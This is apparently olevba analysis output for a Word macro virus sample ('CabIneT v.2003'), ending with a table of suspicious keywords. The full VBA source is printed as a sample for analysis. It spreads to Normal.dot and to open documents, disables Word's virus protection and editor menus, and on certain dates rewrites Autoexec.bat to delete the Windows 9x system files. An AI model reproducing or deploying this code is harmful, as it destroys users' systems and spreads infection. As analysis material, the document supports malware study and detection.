olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Twopey-94ef90e41f05d38cf93bac61dd2b2b2d78edf1fc
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Twopey-94ef90e41f05d38cf93bac61dd2b2b2d78edf1fc - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Option Base 1 'Macro Virus
'---->CabIneT v.2003by: CbrHck.IHABAE0D /Manila, Philippines <----'
'------------------------------------------------------------------
Private Sub CabIneT() '[CabIneT v.2003 for Windows]
On Error Resume Next
OpeyStrt = Options.DefaultFilePath(wdStartupPath)
Transitionfile = OpeyStrt & "\system.txt"
With CommandBars("Tools")
.Reset
.Controls("Macro").Reset
.Controls("Templates and Add-Ins...").Reset
.Controls("Customize...").Reset
End With
For I = NormalTemplate.VBProject.VBComponents.Count To 1 Step -1
themodules = NormalTemplate.VBProject.VBComponents(I).Name
If (themodules <> "ThisDocument") Then Application.OrganizerDelete Source:=NormalTemplate.FullName, Name:=themodules, Object:=wdOrganizerObjectProjectItems
Next I
For Each opendoc In Documents
With opendoc
For J = opendoc.VBProject.VBComponents.Count To 1 Step -1
themodules = opendoc.VBProject.VBComponents(J).Name
If (themodules <> "ThisDocument") And (themodules <> "Reference to Normal") Then Application.OrganizerDelete Source:=opendoc.FullName, Name:=themodules, Object:=wdOrganizerObjectProjectItems
Next J
End With
Next opendoc
Application.ShowVisualBasicEditor = False
Application.DisplayAlerts = wdAlertsNone
ActiveDocument.ReadOnlyRecommended = False
With Dialogs(wdDialogFileSummaryInfo)
.Title = "CabIneT v.2003 Philippines"
.Subject = "Interactive Love Note"
.Author = "CbrHck" 'GREETINGS TO ALL FILIPINO PROGRAMMERS !!!
.Keywords = "dcpe"
.Comments = "RM Diega, I DO LOVE YOU, very much... -TAKE A BUNCH OF CARE- honey!"
.Execute
End With
With Options
.ConfirmConversions = True
.VirusProtection = False
.SaveNormalPrompt = False
End With
CommandBars("Visual Basic").Enabled = False
CommandBars("Visual Basic").Protection = msoBarNoChangeVisible
CommandBars("Visual Basic").Protection = msoBarNoCustomize
CommandBars("Tools").Controls("Macro").Enabled = False
CommandBars("Tools").Controls("Customize...").Enabled = False
CommandBars("Tools").Controls("Templates and Add-Ins...").Enabled = False
CustomizationContext = NormalTemplate
FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
opey = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.lines(1, 185)
If Dir(Transitionfile) = True Then Kill Transitionfile
Open Transitionfile For Output Shared As #1
Print #1, opey
Close #1
If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Find("Opey", 1, 1, 10, 10) = False Then
numberoflines = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, numberoflines
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromFile Transitionfile
NormalTemplate.Save
End If
If ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Find("Opey", 1, 1, 10, 10) = False Then
numberoflines = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, numberoflines
ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.AddFromFile Transitionfile
ActiveDocument.Save
End If
Kill Transitionfile
End Sub
Private Sub Document_Close()
On Error Resume Next
If ActiveDocument.Undo = False And ActiveDocument.Redo = False Then
ExiActiveDocument.Close
End If
Call CabIneT
Message
Attack_Batch
End Sub
Private Sub FileOpen()
On Error Resume Next
Dialogs(wdDialogFileOpen).Show
CabIneT
Message
Attack_Batch
If (Day(Date) = 24) Then Application.PrintOut FileName = "C:\CabIneT.msg.txt"
End Sub
Private Sub FileExit()
On Error Resume Next
CabIneT
Message
Attack_Batch
If ActiveDocument.Saved = False Then ActiveDocument.Save
Application.Quit
End Sub
Private Sub Attack_Batch()
Dim freeF As Integer
On Error Resume Next
If (Day(Date) = 22) Then
Call SetAttr("C:\Autoexec.bat", vbArchive)
freeF = FreeFile 'CabIneT v.2003,
Kill "C:\Autoexec.bat"
Open "C:\Autoexec.bat" For Output As #freeF 'CabIneT Transitional File
Print #freeF, "@Echo Off"
Print #freeF, "Echo Off"
Print #freeF, "Rem barok [ CabIneT v.2003 ] Batch Dummy Implementation"
Print #freeF, "Rem === (c) CbrHck /IHABAE-0D /Manila, Philippines"
Print #freeF, ""
Print #freeF, "cls"
Print #freeF, "If Exist C:\Command.Com goto Begin"
Print #freeF, ":Begin"
Print #freeF, "Rem =CabIneT v.2003 will cracking your system " 'for Windows '9x
Print #freeF, ""
Print #freeF, "Verify = On"
Print #freeF, "Break = Off"
Print #freeF, ""
Print #freeF, "C:\windows\command\attrib c:\io.sys -a -s -h -r"
Print #freeF, "c:\windows\command\attrib c:\msdos.sys -a -s -h -r"
Print #freeF, "del C:\io.sys"
Print #freeF, "de C:\msdos.sys"
Print #freeF, "If Exist C:\Windows\Rundll.exe Copy C:\Windows\Rundll.exe C:\msdos.sys >nul"
Print #freeF, "If Exist C:\Windows\Rundll32.exe Copy C:\Windows\Rundll32.exe C:\io.sys >nul"
Print #freeF, ""
Print #freeF, "cls"
Print #freeF, "echo."
Print #freeF, "echo."
Print #freeF, "echo Runtime Error: Trace CabIneT v.2003 virus is common files."
Print #freeF, "echo."
Print #freeF, "echo CabIneT v.2003 by: CbrHck.IHABAE0D /Manila, Philippines"
Print #freeF, ""
Print #freeF, "echo Closing CabIneT v.2003, CbrHck says (: happy BuGs Router ---->> "
Print #freeF, ""
Print #freeF, "echo."
Print #freeF, "echo."
Print #freeF, "Echo    File(s), Information And Bug(s). Courtesy of CabIneT v.2003"
Print #freeF, "pause"
Print #freeF, "del c:\autoexec.bat"
Close #freeF
End If
End Sub
Private Sub Message()
Dim freeF As Integer
On Error Resume Next
If (Day(Date) = 18) Then
Call SetAttr("C:\CabIneT.msg.txt", vbArchive)
freeF = FreeFile 'CabIneT,
Kill "C:\CabIneT.msg.txt"
Open "C:\CabIneT.msg.txt" For Output As #freeF 'CabIneT message to Everyone!
Print #freeF, "<!--"
Print #freeF, "    FR: CabIneT v.2003"
Print #freeF, "    TO: All Infected Computer"
Print #freeF, ""
Print #freeF, "        People around the World !!!  [ - PEACE BE WITH US ALWAYS - ]"
Print #freeF, ""
Print #freeF, " CabIneT v.2003 revision"
Print #freeF, ""
Print #freeF, " The bugs created merely to updated your system into a higher version. "
Print #freeF, " Windows 95,98 users are the system most commonly infected."
Print #freeF, ""
Print #freeF, " For your patronage"
Print #freeF, ""
Print #freeF, "     ----------     PLEASE UPDATE YOUR SYSTEM     ----------     "
Print #freeF, "     A great advice from CbrHck.IHABAE0D /Manila, Philippines     "
Print #freeF, ""
Print #freeF, ""
Print #freeF, " Also dedicated to: ALL FILIPINO PROGRAMMERS" '
Print #freeF, ""
Print #freeF, " More thanks to RoseMarie"
Print #freeF, ""
Print #freeF, "                                  --CbrHck--"
Print #freeF, ""
Print #freeF, ""
Print #freeF, " The following  code are more confident."
Print #freeF, ""
Print #freeF, ""
Print #freeF, " IHABAE-0D-APPED"
Print #freeF, " CbrHck.Virugoer.(c)12.12.02 ----!> ....message End."
Close #freeF
End If
End Sub





+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Autoexec.bat        |Executable file name                         |
|IOC       |Rundll.exe          |Executable file name                         |
|IOC       |Rundll32.exe        |Executable file name                         |
|IOC       |autoexec.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+
